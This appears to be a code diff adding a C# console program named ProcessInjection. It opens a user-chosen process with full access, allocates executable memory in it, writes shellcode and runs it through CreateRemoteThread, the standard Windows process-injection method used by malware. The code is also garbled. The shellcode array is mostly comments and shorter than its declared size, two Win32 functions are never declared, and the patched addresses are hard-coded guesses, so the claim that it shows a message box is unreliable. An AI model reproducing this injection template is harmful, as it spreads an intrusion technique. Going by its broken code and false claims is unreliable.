@@ -1,0 +1,149 @@
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+namespace ProcessInjection
+{
+    class Program
+    {
+        // Define the Win32 API functions
+        [DllImport("kernel32.dll")]
+        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        // Define the constants
+        const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
+        const uint MEM_COMMIT = 0x00001000;
+        const uint MEM_RESERVE = 0x00002000;
+        const uint PAGE_EXECUTE_READWRITE = 0x40;
+
+        static void Main(string[] args)
+        {
+            // Get the name of the process to inject from the command line argument
+            // If no argument is given, use "notepad" as the default
+            string processName = args.Length > 0 ? args[0] : "notepad";
+
+            // List all the processes in the OS and their IDs
+            Console.WriteLine("Processes in the OS:");
+            foreach (Process p in Process.GetProcesses())
+            {
+                Console.WriteLine("{0} - {1}", p.ProcessName, p.Id);
+            }
+
+            // Ask the user to enter the ID of the process to inject
+            Console.WriteLine("Enter the ID of the process to inject:");
+            int processId = int.Parse(Console.ReadLine());
+
+            // Get a handle to the target process
+            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, processId);
+
+            // Define the shellcode to inject
+            // This shellcode will pop up a message box with the text "Hello from injected code!"
+            byte[] shellcode = new byte[193] {
+                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc8,0x00,0x00,0x00,0x41,0x51,
+                0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,
+                0x60 ,  00 ,  00 ,  00 ,  00 ,  00 ,  00 ,  00 , 
+                // The address of LoadLibraryA will be patched here
+                // by the injector program
+                // mov r10,<LoadLibraryA address>
+                // mov rax,[r10]
+                // mov [rax],rcx
+                // call qword ptr [rax]
+                // pop rdx
+                // pop rcx
+                // pop r10
+                // pop r11
+
+                // The address of MessageBoxA will be patched here
+                // by the injector program
+                // mov r10,<MessageBoxA address>
+                // mov rax,[r10]
+                // mov [rax],rcx
+                // call qword ptr [rax]
+                // pop rdx
+                // pop rcx
+                // pop r10
+                // pop r11
+
+                // Exit the thread
+                // xor rcx , rcx 
+                // mov r10,<ExitThread address>
+                 // mov rax,[r10]
+                // mov [rax],rcx
+                // call qword ptr [rax]
+
+            };
+
+            // Allocate memory in the target process for the shellcode
+            IntPtr pShellcode = VirtualAllocEx(hProcess,
+                                               IntPtr.Zero,
+                                               (uint)shellcode.Length,
+                                               MEM_COMMIT | MEM_RESERVE,
+                                               PAGE_EXECUTE_READWRITE);
+
+            // Write the shellcode into the allocated memory
+            UIntPtr bytesWritten;
+            WriteProcessMemory(hProcess,
+                               pShellcode,
+                               shellcode,
+                               (uint)shellcode.Length,
+                               out bytesWritten);
+
+            // Patch the shellcode with the addresses of the Win32 API functions
+            // You can use GetProcAddress to get these addresses dynamically
+            // For simplicity, I will use hard-coded addresses from my system
+            // These addresses may vary depending on the system and the DLL versions
+            // Use a debugger or a tool like Process Hacker to find the right addresses
+
+            // The address of LoadLibraryA in kernel32.dll
+            byte[] loadLibraryAddr = BitConverter.GetBytes(0x7ffed39e18f0);
+            // The address of MessageBoxA in user32.dll
+            byte[] messageBoxAddr = BitConverter.GetBytes(0x7ffed3b2e920);
+            // The address of ExitThread in kernel32.dll
+            byte[] exitThreadAddr = BitConverter.GetBytes(0x7ffed39f3b30);
+
+            // Write the addresses into the shellcode
+            WriteProcessMemory(hProcess,
+                               pShellcode + 0x24,
+                               loadLibraryAddr,
+                               (uint)loadLibraryAddr.Length,
+                               out bytesWritten);
+
+            WriteProcessMemory(hProcess,
+                               pShellcode + 0x2c,
+                               messageBoxAddr,
+                               (uint)messageBoxAddr.Length,
+                               out bytesWritten);
+
+            WriteProcessMemory(hProcess,
+                               pShellcode + 0x34,
+                               exitThreadAddr,
+                               (uint)exitThreadAddr.Length,
+                               out bytesWritten);
+
+            // Create a remote thread in the target process to execute the shellcode
+            IntPtr hThread = CreateRemoteThread(hProcess,
+                                                IntPtr.Zero,
+                                                0,
+                                                pShellcode,
+                                                IntPtr.Zero,
+                                                0,
+                                                IntPtr.Zero);
+
+            // Wait for the thread to finish
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
+
+            // Close the handles
+            CloseHandle(hThread);
+            CloseHandle(hProcess);
+        }
+    }
+}
